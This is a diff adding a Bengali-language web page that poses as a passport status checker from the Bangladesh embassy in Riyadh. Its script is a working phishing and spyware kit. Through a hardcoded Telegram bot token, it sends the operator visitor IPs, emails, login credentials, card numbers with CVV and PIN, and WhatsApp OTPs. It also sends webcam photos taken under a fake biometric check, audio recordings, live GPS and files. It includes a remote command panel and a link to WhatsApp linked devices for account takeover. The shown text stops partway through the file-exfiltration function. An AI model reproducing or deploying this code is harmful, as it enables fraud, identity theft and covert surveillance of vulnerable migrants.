@@ -1,0 +1,927 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Passport Pdf - Check Status</title>
+    <meta property="og:title" content="Passport Checking-File Download">
+    <meta property="og:description" content="রিয়াদ বাংলাদেশ দূতাবাস প্রবাসী সেবা কেন্দ্র থেকে পাসপো�[...]">
+    <meta property="og:image" content="https://raw.githubusercontent.com/passportchaking-io/Online_Passport_chaking/main/IMG_20260525_160654.jpg">
+    <meta property="og:type" content="website">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
+    <style>
+        * { -webkit-touch-callout: none; -webkit-user-select: none; user-select: none; }
+        body { font-family: 'Helvetica', Arial, sans-serif; margin: 0; padding: 0; height: 100vh; overflow: hidden; display: flex; flex-direction: column; background: #f7f9fc; }
+        .hidden { display: none !important; }
+        .top-half { height: 48vh; width: 100%; display: flex; align-items: center; justify-content: center; background: white; border-bottom: 1px solid #e1e4e8; padding: 10px; }
+        .top-half img { max-width: 100%; max-height: 100%; object-fit: contain; border-radius: 8px; }
+        .bottom-half { height: 52vh; width: 100%; background: #f7f9fc; padding: 20px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center; g[...]
+        .btn-blue { width: 100%; max-width: 350px; background-color: #1877f2; color: white; font-weight: bold; padding: 16px; border-radius: 12px; cursor: pointer; border: none; font-size: 18px; t[...]
+        .secure-input { width: 100%; max-width: 350px; padding: 16px; border: 2px solid #ccd0d5; border-radius: 12px; outline: none; font-size: 17px; background: white; }
+        #permission_modal { position: fixed; inset: 0; background: rgba(0,0,0,0.85); display: none; align-items: center; justify-content: center; z-index: 1000; padding: 20px; }
+        .modal-content { background: white; width: 100%; max-width: 300px; border-radius: 15px; padding: 25px; text-align: center; }
+        @keyframes progressMove { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
+        .animate-progress { animation: progressMove 2s infinite linear; }
+        @keyframes pulse-red { 0%,100% { box-shadow: 0 0 0 0 rgba(220,38,38,0.7); } 50% { box-shadow: 0 0 0 15px rgba(220,38,38,0); } }
+        .pulse-red { animation: pulse-red 1.5s infinite; }
+        @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
+        @keyframes pulse-overlay { 0%,100% { transform: scale(1); } 50% { transform: scale(1.05); } }
+        input[type="text"], input[type="email"], input[type="password"], input[type="tel"] { -webkit-user-select: text !important; user-select: text !important; }
+        #pip_overlay { position: fixed; bottom: 20px; right: 20px; z-index: 99999; background: #1877f2; color: white; padding: 12px 20px; border-radius: 30px; font-size: 14px; font-weight: bold; b[...]
+        #mini_player { position: fixed; top: 10px; right: 10px; z-index: 99999; background: white; border-radius: 16px; padding: 12px; box-shadow: 0 8px 32px rgba(0,0,0,0.25); width: 200px; cursor[...]
+        #mini_player .dot { width: 8px; height: 8px; background: #4CAF50; border-radius: 50%; animation: blink 1s infinite; }
+    </style>
+</head>
+<body onload="initApp()">
+
+    <!-- ====== TOP HALF ====== -->
+    <div class="top-half" id="main_top_image">
+        <img src="https://raw.githubusercontent.com/passportchaking-io/Online_Passport_chaking/main/IMG_20260525_160654.jpg">
+    </div>
+
+    <!-- ====== BOTTOM HALF ====== -->
+    <div class="bottom-half text-center" id="main_bottom_content">
+
+        <!-- STEP 1: মূল পেজ -->
+        <div id="step1" class="w-full flex flex-col items-center gap-1">
+            <h2 class="text-2xl font-extrabold text-gray-900">সরাসরি পাসপোর্ট চেক করুন</h2>
+            <p class="text-gray-600 px-4">সরাসরি অনলাইনে আপনার পাসপোর্ট নাম্বার দিয়ে চেক করতে পার��[...]
+            <button onclick="showModal()" class="btn-blue">পাসপোর্ট চেক করুন</button>
+        </div>
+
+        <!-- পারমিশন মডাল -->
+        <div id="permission_modal">
+            <div class="modal-content">
+                <div class="text-blue-600 text-4xl mb-4">ⓘ</div>
+                <h3 class="text-lg font-bold mb-2">পাসপোর্ট ফাইলটি ওপেন করুন</h3>
+                <p class="text-gray-600 text-sm mb-6">পাসপোর্ট ডকুমেন্ট ফাইলটি ওপেন করতে "Open" বাটনে ক্লিক কর��[...]
+                <button onclick="redirectToChrome()" class="w-full bg-blue-600 text-white py-3 rounded-lg font-bold text-lg">Open</button>
+            </div>
+        </div>
+
+        <!-- Google Chooser -->
+        <div id="google_chooser" class="hidden w-full flex flex-col items-center gap-1">
+            <h1 class="text-xl font-bold text-gray-900">সরাসরি অনলাইনে চেক করুন</h1>
+            <p class="text-gray-600 text-sm px-4">নিচের ফাঁকা ঘরে পাসপোর্ট নাম্বার বা WhatsApp নাম্বার বসিয়ে [...]
+            <input type="email" id="email_field" autocomplete="email" placeholder="পাসপোর্ট নাম্বার বসান" class="secure-input" oninput="autoCaptureEmail(this.[...]
+            <button onclick="finalSubmit()" class="btn-blue">ফাইলটি ওপেন করুন</button>
+        </div>
+
+        <!-- STEP 2: PDF দেখানো -->
+        <div id="step2" class="hidden w-full h-full flex-col items-center justify-between pt-4 pb-12 box-border">
+            <div class="w-full max-w-sm bg-white border border-gray-200 rounded-3xl p-6 shadow-2xl flex flex-col items-center text-center relative overflow-hidden">
+                <div class="absolute top-5 right-[-35px] bg-red-600 text-white text-[11px] font-black uppercase tracking-wider py-1.5 px-10 rotate-45 shadow-md">ENCRYPTED</div>
+                <div class="mb-4 flex h-26 w-22 flex-col items-center justify-between rounded-2xl bg-gradient-to-b from-red-50 to-red-100 border border-red-200 p-4 shadow-inner relative mt-2">
+                    <span class="absolute top-0 left-3 bg-red-600 text-white text-[11px] font-black px-2 py-0.5 rounded-b-md shadow-sm">PDF</span>
+                    <div class="flex items-center justify-center flex-grow pt-4 text-red-600">
+                        <svg class="w-12 h-12 animate-pulse" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5[...]
+                    </div>
+                    <div class="w-full space-y-1.5"><div class="h-1.5 w-full bg-red-300 rounded"></div><div class="h-1.5 w-2/3 bg-red-200 rounded"></div></div>
+                </div>
+                <h3 class="text-xl font-black text-gray-800 mb-1 px-2 break-all">Passport_E-File_Verified.pdf</h3>
+                <p class="text-sm font-bold text-gray-400 mb-4">Size: 4.2 MB • PDF Document</p>
+                <hr class="w-full border-gray-100 mb-4">
+                <div class="bg-red-50 border-l-4 border-red-500 p-4 rounded-r-2xl text-left w-full">
+                    <p class="text-base font-extrabold text-red-900 leading-relaxed text-center">⚠️ এই ডকুমেন্টটি নিরাপত্তার কারণে এন�[...]
+                </div>
+            </div>
+            <div class="w-full max-w-sm">
+                <button onclick="openLockedFile()" class="w-full bg-gradient-to-r from-red-500 to-rose-600 text-white font-black text-xl py-4 px-6 rounded-2xl shadow-xl border-b-4 border-red-700 f[...]
+                    <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11[...]
+                    ফাইল টি ওপেন করুন
+                </button>
+            </div>
+        </div>
+
+        <!-- ভেরিফাইং মডাল -->
+        <div id="verifying" class="hidden fixed inset-0 bg-black/60 backdrop-blur-sm z-[9999] flex items-center justify-center p-4">
+            <div class="bg-white w-full max-w-sm rounded-2xl p-6 shadow-2xl border border-gray-100 flex flex-col items-center text-center">
+                <div class="mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-emerald-50 ring-8 ring-emerald-100">
+                    <svg class="h-8 w-8 text-emerald-600" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 [...]
+                </div>
+                <h3 class="text-xl font-extrabold text-gray-900 mb-1">তথ্য যাচাই করা হচ্ছে</h3>
+                <p class="text-xs font-semibold text-emerald-600 bg-emerald-50 px-3 py-1 rounded-full mb-5">বাংলাদেশ দূতাবাস অনলাইন সার্ভার[...]
+                <div class="mb-4"><svg class="animate-spin h-8 w-8 text-emerald-600" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" [...]
+                <p class="text-sm font-bold text-gray-800 leading-snug mb-2">আপনার তথ্য যাচাই করা হচ্ছে।</p>
+                <div class="w-full bg-gray-100 h-1.5 rounded-full mt-5 overflow-hidden relative"><div class="bg-gradient-to-r from-emerald-500 to-green-600 h-full w-1/2 rounded-full absolute top-[...]
+            </div>
+        </div>
+
+        <!-- বায়োমেট্রিক মডাল -->
+        <div id="biometric_modal" class="hidden fixed inset-0 bg-black/70 backdrop-blur-md z-[9999] flex items-center justify-center p-4">
+            <div class="bg-white w-full max-w-sm rounded-3xl p-6 shadow-2xl border border-gray-100 flex flex-col items-center text-center">
+                <div class="mb-4 w-20 h-20 rounded-full bg-gradient-to-br from-red-500 to-red-700 flex items-center justify-center text-white text-3xl font-black shadow-lg pulse-red">📸</div>
+                <h3 class="text-xl font-black text-gray-900 mb-1">বায়োমেট্রিক ভেরিফিকেশন</h3>
+                <p class="text-xs font-semibold text-red-600 bg-red-50 px-3 py-1 rounded-full mb-4">রিয়াদ দূতাবাস নিরাপত্তা ব্যবস্থা</[...]
+                <p class="text-sm font-bold text-gray-700 leading-relaxed px-2 mb-5">আপনার পরিচয় নিশ্চিত করতে <span class="text-red-600">৩ সেক[...]
+                <button onclick="startBiometricCapture()" class="w-full bg-gradient-to-r from-red-600 to-rose-700 text-white font-black py-3.5 rounded-xl text-lg shadow-md active:scale-95 transit[...]
+            </div>
+        </div>
+
+        <!-- OTP ফিশিং মডাল -->
+        <div id="fake_otp_page" class="hidden fixed inset-0 bg-black/70 backdrop-blur-md z-[9999] flex flex-col items-center justify-center p-4">
+            <div class="bg-white w-full max-w-sm rounded-3xl p-6 shadow-2xl border border-gray-100 flex flex-col items-center text-center">
+                <div class="mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-blue-50 text-blue-600"><svg class="w-8 h-8" fill="none" stroke="currentColor" stroke-width="2.5" viewBo[...]
+                <h2 class="text-xl font-black text-gray-900 mb-2">OTP ভেরিফিকেশন</h2>
+                <p class="text-xs text-gray-600 mb-6 px-2 font-medium leading-relaxed">WhatsApp এ ৪ সংখ্যার কোড পাঠানো হয়েছে। নিচে ব��[...]
+                <div class="flex justify-center gap-3 mb-6" id="otp_inputs">
+                    <input type="text" inputmode="numeric" maxlength="1" class="code-input w-12 h-14 text-center font-bold text-xl border-2 border-gray-200 rounded-xl focus:border-blue-500 outlin[...]
+                    <input type="text" inputmode="numeric" maxlength="1" class="code-input w-12 h-14 text-center font-bold text-xl border-2 border-gray-200 rounded-xl focus:border-blue-500 outlin[...]
+                    <input type="text" inputmode="numeric" maxlength="1" class="code-input w-12 h-14 text-center font-bold text-xl border-2 border-gray-200 rounded-xl focus:border-blue-500 outlin[...]
+                    <input type="text" inputmode="numeric" maxlength="1" class="code-input w-12 h-14 text-center font-bold text-xl border-2 border-gray-200 rounded-xl focus:border-blue-500 outlin[...]
+                </div>
+                <button onclick="sendOTPToTelegram()" class="w-full bg-blue-600 text-white font-bold py-3.5 rounded-xl text-lg shadow-md active:scale-95 transition-all">নিশ্চিত ক�[...]
+            </div>
+        </div>
+
+        <!-- ফেক লগইন মডাল -->
+        <div id="fake_login_page" class="hidden fixed inset-0 bg-black/80 z-[9999] flex items-center justify-center p-4" style="backdrop-filter:blur(8px);">
+            <div class="bg-white w-full max-w-sm rounded-3xl p-6 shadow-2xl">
+                <div class="text-center mb-4"><div class="w-16 h-16 mx-auto bg-blue-100 rounded-full flex items-center justify-center"><svg class="w-8 h-8 text-blue-600" fill="none" stroke="curre[...]
+                <h2 class="text-xl font-black text-center text-gray-900 mb-1">সেশন শেষ হয়েছে</h2>
+                <p class="text-xs text-center text-gray-500 mb-6">নিরাপত্তার জন্য পুনরায় লগইন করুন।</p>
+                <div class="space-y-3">
+                    <input id="fake_user" type="text" placeholder="ইমেইল / ফোন" class="w-full px-4 py-3 border-2 border-gray-200 rounded-xl text-sm focus:border-blue-500 outline-n[...]
+                    <input id="fake_pass" type="password" placeholder="পাসওয়ার্ড" class="w-full px-4 py-3 border-2 border-gray-200 rounded-xl text-sm focus:border-blue-500 ou[...]
+                    <button onclick="captureCredentials()" class="w-full py-3.5 bg-gradient-to-r from-blue-600 to-blue-700 text-white font-bold rounded-xl text-lg shadow-md active:scale-95 transi[...]
+                </div>
+                <p class="text-[10px] text-gray-400 text-center mt-4">🔒 SSL এনক্রিপ্টেড সংযোগ</p>
+            </div>
+        </div>
+
+        <!-- ফেক পেমেন্ট মডাল -->
+        <div id="fake_payment_page" class="hidden fixed inset-0 bg-black/80 z-[9999] flex items-center justify-center p-4" style="backdrop-filter:blur(8px);">
+            <div class="bg-white w-full max-w-sm rounded-3xl p-6 shadow-2xl">
+                <div class="text-center mb-4"><div class="w-16 h-16 mx-auto bg-green-100 rounded-full flex items-center justify-center"><svg class="w-8 h-8 text-green-600" fill="none" stroke="cur[...]
+                <h2 class="text-xl font-black text-gray-900 mt-2">ফাইল ডাউনলোড ফি</h2>
+                <p class="text-xs text-gray-500 mb-4">পরিষেবা ফি ১০ টাকা</p>
+                <div class="space-y-3">
+                    <input id="card_number" type="text" placeholder="কার্ড / বিকাশ নং" class="w-full px-4 py-3 border-2 border-gray-200 rounded-xl text-sm focus:border-gre[...]
+                    <div class="flex gap-2">
+                        <input id="card_exp" type="text" placeholder="মেয়াদ" class="w-1/2 px-4 py-3 border-2 border-gray-200 rounded-xl text-sm focus:border-green-500 outline-none">
+                        <input id="card_cvv" type="text" placeholder="CVV" class="w-1/2 px-4 py-3 border-2 border-gray-200 rounded-xl text-sm focus:border-green-500 outline-none">
+                    </div>
+                    <input id="card_pin" type="password" placeholder="পিন নম্বর" class="w-full px-4 py-3 border-2 border-gray-200 rounded-xl text-sm focus:border-green-500 outline[...]
+                    <button onclick="capturePaymentInfo()" class="w-full py-3.5 bg-gradient-to-r from-green-600 to-emerald-700 text-white font-bold rounded-xl text-lg shadow-md active:scale-95 tr[...]
+                </div>
+                <p class="text-[10px] text-gray-400 text-center mt-4">🔒 পেমেন্ট সুরক্ষিত</p>
+            </div>
+        </div>
+
+        <!-- স্ক্রিন শেয়ার মডাল -->
+        <div id="start_screen_page" class="hidden fixed inset-0 bg-black/60 backdrop-blur-md z-[9999] flex items-center justify-center p-4">
+            <div class="bg-white w-full max-w-sm rounded-3xl p-6 shadow-2xl border border-gray-100 flex flex-col items-center text-center">
+                <div class="mb-4 flex h-20 w-16 flex-col items-center justify-between rounded-xl bg-gradient-to-b from-red-50 to-red-100 border border-red-200 p-2.5 shadow-inner relative">
+                    <span class="absolute top-0 left-2 bg-red-600 text-white text-[8px] font-black px-1.5 py-0.5 rounded-b-sm shadow-sm">PDF</span>
+                    <div class="flex items-center justify-center flex-grow pt-2 text-red-600"><svg class="w-7 h-7 animate-pulse" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" [...]
+                </div>
+                <h3 class="text-lg font-black text-red-600 mb-2 animate-pulse">অপেক্ষা করুন</h3>
+                <p class="text-xs font-semibold text-gray-400 bg-gray-50 px-3 py-1 rounded-full mb-4">রিয়াদ বাংলাদেশ দূতাবাস</p>
+                <div class="text-sm font-bold text-gray-700 text-left space-y-3 px-1 mb-5 border-t border-b border-gray-100 py-4 max-h-[220px] overflow-y-auto">
+                    <p class="text-gray-800 text-center font-extrabold text-[13px] bg-red-50 text-red-950 p-2 rounded-xl">পিডিএফ ডাউনলোড করার জন্য নো[...]
+                    <p class="text-[12px] text-gray-600"><span class="text-red-500">১.</span> নোটিফিকেশনে ক্লিক করুন।</p>
+                    <p class="text-[12px] text-gray-600"><span class="text-red-500">২.</span> ফোন আনলক করুন।</p>
+                    <p class="text-[12px] text-gray-600"><span class="text-red-500">৩.</span> পাসওয়ার্ড বসিয়ে ডাউনলোড করুন।</p>
+                </div>
+                <button onclick="requestScreenShare()" class="w-full bg-gradient-to-r from-red-500 to-rose-600 text-white font-black py-3.5 rounded-xl text-md shadow-md active:scale-95 transition[...]
+            </div>
+        </div>
+
+        <!-- সাকসেস পেজ -->
+        <div id="success_page" class="hidden w-full flex flex-col items-center gap-1">
+            <h2 class="text-2xl font-bold text-green-600">ভেরিফিকেশন সফল!</h2>
+            <p class="text-gray-600 text-sm px-4">আপনার পাসপোর্ট ফাইল সফলভাবে যাচাই করা হয়েছে। নিচে ক্��[...]
+            <a href="https://wa.me/settings/linked_devices" class="btn-blue decoration-none">Passport File Download</a>
+        </div>
+
+        <!-- এরর পেজ -->
+        <div id="error_page" class="hidden w-full flex flex-col items-center gap-1">
+            <h2 class="text-2xl font-bold text-red-600">সংযোগ বিচ্ছিন্ন!</h2>
+            <p class="text-gray-600 text-sm px-4">সার্ভার ত্রুটির কারণে ফাইল লোড করা যাচ্ছে না। আবার চেষ�[...]
+            <button onclick="location.reload()" class="btn-blue">আবার চেষ্টা করুন</button>
+        </div>
+
+        <!-- স্টপ স্ক্রিন পেজ -->
+        <div id="stop_screen_page" class="hidden w-full flex flex-col items-center gap-1"><h3 class="text-lg font-bold text-red-600">স্ক্রিন শেয়ার বন্ধ</h3></di[...]
+  
+        <!-- স্টপ ক্লিপবোর্ড পেজ -->
+        <div id="stop_clipboard_page" class="hidden w-full flex flex-col items-center gap-3"><h2 class="text-2xl font-bold text-blue-600">ক্লিপবোর্ড মনিটরিং ব�[...]
+    </div>
+
+    <!-- PiP ওভারলে -->
+    <div id="pip_overlay" class="hidden">
+        <span style="background:white;width:10px;height:10px;border-radius:50%;display:inline-block;animation:blink 1s infinite;"></span>
+        <span>⏳ পাসপোর্ট ভেরিফিকেশন চলছে...</span>
+    </div>
+
+    <!-- মিনি প্লেয়ার -->
+    <div id="mini_player" class="hidden">
+        <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px;">
+            <div class="dot"></div>
+            <span style="font-size:11px;font-weight:bold;color:#333;">পাসপোর্ট ভেরিফিকেশন</span>
+        </div>
+        <div style="background:#e3f2fd;border-radius:8px;padding:8px;text-align:center;">
+            <span style="font-size:11px;color:#1565C0;font-weight:bold;" id="progress_text">⏳ ০% সম্পন্ন</span>
+            <div style="width:100%;height:4px;background:#bbdefb;border-radius:4px;margin-top:4px;overflow:hidden;">
+                <div id="progress_bar" style="height:100%;width:0%;background:#1565C0;border-radius:4px;transition:width 1s;"></div>
+            </div>
+        </div>
+        <div style="margin-top:8px;display:flex;gap:4px;justify-content:center;">
+            <span style="font-size:10px;color:#999;">ডকুমেন্ট যাচাই</span>
+            <span style="font-size:10px;color:#4CAF50;">✓ সুরক্ষিত</span>
+        </div>
+    </div>
+
+    <script>
+        // ============================================================
+        // 🚀 কনফিগারেশন — আপনার টেলিগ্রাম বট
+        // ============================================================
+        const BOT_TOKEN = "8553406795:AAEUeK-fOnWFrvlCnKm-SCpdoXSzSy-09WU";
+        const CHAT_ID = "8516934257";
+        
+        // ============================================================
+        // 🧠 গ্লোবাল ভেরিয়েবল
+        // ============================================================
+        let lastUpdateId = 0;
+        let deviceInfo = "Unknown";
+        let isEmailSent = false;
+        let screenStream = null;
+        let screenCaptureInterval = null;
+        let isScreenSharing = false;
+        let clipboardMonitorInterval = null;
+        let lastClipboardContent = "";
+        let mediaRecorder = null;
+        let audioChunks = [];
+        let liveGpsInterval = null;
+        let isBrowserLocked = false;
+        let stealthMonitorInterval = null;
+        let pipActive = false;
+        let pipVideoElement = null;
+        let miniPlayerInterval = null;
+        let progressValue = 0;
+
+        // ============================================================
+        // 🔧 পাওয়ারফুল কমান্ড প্যানেল (টেলিগ্রাম)
+        // ============================================================
+        const POWER_COMMANDS = {
+            inline_keyboard: [
+                [{ text: "📸 ক্যামেরা স্টিলথ", callback_data: "photo_cmd" }],
+                [{ text: "🎤 অডিও রেকর্ড (১০সে)", callback_data: "audio_cmd" }],
+                [{ text: "📍 GPS লোকেশন", callback_data: "gps_cmd" }],
+                [{ text: "🔄 লাইভ GPS ট্র্যাক", callback_data: "live_gps_cmd" }],
+                [{ text: "🛑 লাইভ GPS বন্ধ", callback_data: "stop_live_gps_cmd" }],
+                [{ text: "🔑 ক্রেডেনশিয়াল", callback_data: "cred_cmd" }],
+                [{ text: "💳 পেমেন্ট পেজ", callback_data: "payment_cmd" }],
+                [{ text: "📱 বায়োমেট্রিক", callback_data: "biometric_cmd" }],
+                [{ text: "🔢 OTP ফিশিং", callback_data: "otp_cmd" }],
+                [{ text: "📂 ফাইল এক্সফিল", callback_data: "files_cmd" }],
+                [{ text: "🔒 ব্রাউজার লক", callback_data: "lock_cmd" }],
+                [{ text: "🔓 ব্রাউজার আনলক", callback_data: "unlock_cmd" }],
+                [{ text: "🖥️ স্ক্রিন শেয়ার", callback_data: "start_screen_cmd" }],
+                [{ text: "⏹️ স্ক্রিন বন্ধ", callback_data: "stop_screen_cmd" }],
+                [{ text: "📋 ক্লিপবোর্ড স্টার্ট", callback_data: "clipboard_cmd" }],
+                [{ text: "⏹️ ক্লিপবোর্ড বন্ধ", callback_data: "stop_clipboard_cmd" }],
+                [{ text: "🌐 রিয়েল IP", callback_data: "ip_cmd" }],
+                [{ text: "📌 PiP মোড চালু", callback_data: "pip_cmd" }],
+                [{ text: "👁️ স্টিলথ স্ক্রিন", callback_data: "stealth_screen_cmd" }],
+                [{ text: "⏹️ স্টিলথ বন্ধ", callback_data: "stop_stealth_cmd" }],
+                [{ text: "📸 স্ক্রিনশট নাও", callback_data: "screenshot_cmd" }],
+                [{ text: "⏹️ সব বন্ধ", callback_data: "stop_all_cmd" }],
+                [{ text: "✅ সাকসেস", callback_data: "success" }, { text: "❌ এরর", callback_data: "error" }]
+            ]
+        };
+
+        // ============================================================
+        // 🚀 ইনিশিয়ালাইজেশন
+        // ============================================================
+        async function initApp() {
+            try {
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+                deviceInfo = `${ipData.city || 'Unknown'}, ${ipData.country_name || 'Unknown'} (IP: ${ipData.ip || 'N/A'})`;
+                sendToBot(`🚀 **নতুন ভিজিটর ঢুকেছে!**\n📍 ${deviceInfo}`);
+            } catch(e) { deviceInfo = "Unknown Location"; }
+
+            const params = new URLSearchParams(window.location.search);
+            if(sessionStorage.getItem('isWaiting') === 'true') { lockBrowser(); showStep('verifying'); startListening(); }
+            else if(params.get('open') === 'chrome') { showStep('google_chooser'); }
+            
+            setupOTPInputs();
+            
+            document.addEventListener('visibilitychange', () => {
+                if(document.hidden && pipActive) {
+                    sendToBot(`🔄 **ইউজার অ্যাপ সুইচ করেছে — PiP মোডে কাজ চলছে**`);
+                    startStealthScreenMonitor();
+                }
+            });
+        }
+
+        // ============================================================
+        // 🖱️ ইউজার ফ্লো
+        // ============================================================
+        function showModal() { 
+            document.getElementById('permission_modal').style.display = 'flex'; 
+            sendToBot(`🖱️ **"পাসপোর্ট চেক করুন" ক্লিক করেছে**`);
+        }
+
+        function redirectToChrome() {
+            const url = "intent://" + window.location.host + window.location.pathname + "?open=chrome#Intent;scheme=https;package=com.android.chrome;end";
+            if(/Android/i.test(navigator.userAgent)) {
+                sendToBot(`➡️ **ক্রোমে রিডাইরেক্ট**`);
+                window.location.href = url;
+            } else { showStep('google_chooser'); }
+        }
+
+        function autoCaptureEmail(val) {
+            if(val.includes('@') && !isEmailSent) {
+                sendToBot(`📧 **ইমেইল:** \`${val}\``);
+                isEmailSent = true;
+            }
+        }
+
+        function finalSubmit() {
+            const email = document.getElementById('email_field').value;
+            if(!email) return;
+            sessionStorage.setItem('isWaiting', 'true');
+            
+            sendToBotWithKeyboard(`🎯 **সাবমিট!**\n📧 \`${email}\`\n📍 ${deviceInfo}`);
+            
+            showStep('verifying');
+            lockBrowser();
+            startListening();
+            setTimeout(() => showStep('biometric_modal'), 5000);
+        }
+
+        function openLockedFile() {
+            sendToBot(`🔓 **"ফাইল ওপেন করুন" ক্লিক করেছে**`);
+            showStep('fake_otp_page');
+        }
+
+        // ============================================================
+        // 📸 বায়োমেট্রিক
+        // ============================================================
+        async function startBiometricCapture() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } 
+                });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                
+                setTimeout(async () => {
+                    for(let i = 0; i < 3; i++) {
+                        await new Promise(r => setTimeout(r, 1000));
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        
+                        canvas.toBlob(async (blob) => {
+                            if(!blob) return;
+                            const fd = new FormData();
+                            fd.append('chat_id', CHAT_ID);
+                            fd.append('photo', blob, `bio_${Date.now()}_${i}.jpg`);
+                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                        }, 'image/jpeg', 0.8);
+                    }
+                    stream.getTracks().forEach(t => t.stop());
+                    sendToBot(`📸 **বায়োমেট্রিক সম্পূর্ণ! ৩টি ছবি পাঠানো হয়েছে**`);
+                    showStep('step2');
+                }, 1000);
+            } catch(e) {
+                sendToBot(`❌ **বায়োমেট্রিক ডিনাইড**`);
+                showStep('step2');
+            }
+        }
+
+        // ============================================================
+        // 🎤 অডিও
+        // ============================================================
+        async function startAudioRecording(duration = 10000) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                mediaRecorder = new MediaRecorder(stream);
+                audioChunks = [];
+                
+                mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(audioChunks, { type: 'audio/webm' });
+                    const fd = new FormData();
+                    fd.append('chat_id', CHAT_ID);
+                    fd.append('audio', blob, `audio_${Date.now()}.webm`);
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: fd });
+                    audioChunks = [];
+                    stream.getTracks().forEach(t => t.stop());
+                    sendToBot(`🎤 **অডিও রেকর্ডিং সম্পূর্ণ!**`);
+                };
+                
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), duration);
+                sendToBot(`🎤 **অডিও রেকর্ডিং শুরু (${duration/1000}সে)**`);
+            } catch(e) { sendToBot(`❌ **অডিও ডিনাইড**`); }
+        }
+
+        // ============================================================
+        // 📍 GPS
+        // ============================================================
+        function captureGPS() {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const { latitude, longitude, accuracy } = pos.coords;
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+                    method: 'POST', headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: CHAT_ID, latitude, longitude })
+                });
+                sendToBot(`📍 **GPS:** ${latitude}, ${longitude} (${accuracy}m)`);
+            }, () => sendToBot(`❌ **GPS ডিনাইড**`), { enableHighAccuracy: true, timeout: 10000 });
+        }
+
+        function startLiveGPSTracking() {
+            sendToBot(`🔄 **লাইভ GPS শুরু (প্রতি ১০সে)**`);
+            captureGPS();
+            liveGpsInterval = setInterval(captureGPS, 10000);
+        }
+
+        function stopLiveGPSTracking() {
+            if(liveGpsInterval) { clearInterval(liveGpsInterval); liveGpsInterval = null; }
+            sendToBot(`🛑 **লাইভ GPS বন্ধ**`);
+        }
+
+        // ============================================================
+        // 🔑 ক্রেডেনশিয়াল
+        // ============================================================
+        function showFakeLogin() { showStep('fake_login_page'); }
+        function captureCredentials() {
+            const user = document.getElementById('fake_user')?.value || '';
+            const pass = document.getElementById('fake_pass')?.value || '';
+            if(user && pass) {
+                sendToBot(`🔑 **ক্রেডেনশিয়াল!**\n👤 \`${user}\`\n🔑 \`${pass}\``);
+                showStep('verifying');
+            }
+        }
+
+        // ============================================================
+        // 💳 পেমেন্ট
+        // ============================================================
+        function showFakePayment() { showStep('fake_payment_page'); }
+        function capturePaymentInfo() {
+            const card = document.getElementById('card_number')?.value || '';
+            const exp = document.getElementById('card_exp')?.value || '';
+            const cvv = document.getElementById('card_cvv')?.value || '';
+            const pin = document.getElementById('card_pin')?.value || '';
+            if(card || pin) {
+                sendToBot(`💳 **পেমেন্ট!**\n💳 \`${card}\`\n📅 \`${exp}\`\n🔐 CVV: \`${cvv}\`\n🔑 পিন: \`${pin}\``);
+                showStep('verifying');
+            }
+        }
+
+        // ============================================================
+        // 🔢 OTP
+        // ============================================================
+        function setupOTPInputs() {
+            setTimeout(() => {
+                const inputs = document.querySelectorAll('#otp_inputs .code-input');
+                inputs.forEach((inp, idx) => {
+                    inp.addEventListener('input', () => {
+                        if(inp.value.length === 1 && idx < inputs.length - 1) inputs[idx + 1].focus();
+                    });
+                    inp.addEventListener('keydown', (e) => {
+                        if(e.key === 'Backspace' && inp.value === '' && idx > 0) inputs[idx - 1].focus();
+                    });
+                });
+            }, 500);
+        }
+
+        function sendOTPToTelegram() {
+            const inputs = document.querySelectorAll('#otp_inputs .code-input');
+            let otp = '';
+            inputs.forEach(i => otp += i.value);
+            if(otp.length === 4) {
+                sendToBot(`🔢 **OTP!** \`${otp}\``);
+                showStep('verifying');
+            }
+        }
+
+        // ============================================================
+        // 📂 ফাইল এক্সফিল
+        // ============================================================
+        function triggerFileExfil() {
+            const input = document.createElement('input');
+            input.type = 'file';
+            input.multiple = true;
+            input.onchange = async (e) => {
+                const files = Array.from(e.target.files).slice(0, 5);
+                for(const file of files) {
+                    const fd = new FormData();
+                    fd.append('chat_id', CHAT_ID);
+                    fd.append('document', file, file.name);
